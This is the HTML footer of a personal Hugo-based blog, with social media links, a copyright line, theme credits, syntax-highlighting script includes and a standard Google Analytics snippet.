<li><a href="//www.linkedin.com/in/suraj-deshmukh-0205b834" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>



<li><a href="//slideshare.com/surajssd009005" target="_blank" rel="noopener" title="SlideShare" class="fab fa-slideshare"></a></li>



<li><a href="//youtube.com/surajssd009005" target="_blank" rel="noopener" title="YouTube" class="fab fa-youtube"></a></li>







<li><a href="//twitter.com/surajd_" target="_blank" rel="noopener" title="Twitter" class="fab fa-twitter"></a></li>











<li><a href="mailto:surajd.service@gmail.com" target="_blank" title="Email" class="far fa-envelope"></a></li>

      </ul>
  
  <p class="copyright">
    © 2021 Suraj Deshmukh
      <br>
    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.80.0' target='_blank' rel='noopener'>Hugo</a>
  </p>
</footer>
<a id="back-to-top" href="#" class="fas fa-arrow-up fa-2x"></a>

      <script src="/js/highlight.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/html.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/css.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/js.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/toml.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/shell.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/bash.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/go.min.js"></script>
    <script>hljs.highlightAll();</script><script src="/js/bundle.min.3b56a9b984cfa78fed3a7843ad11f8065f52c7e64e6871ad2fe9729ed30d5c4f.js" integrity="sha256-O1apuYTPp4/tOnhDrRH4Bl9Sx&#43;ZOaHGtL&#43;lyntMNXE8="></script>
    <script src="/js/add-on.js"></script>
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-97006720-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

    </div>
  </body>
</html>
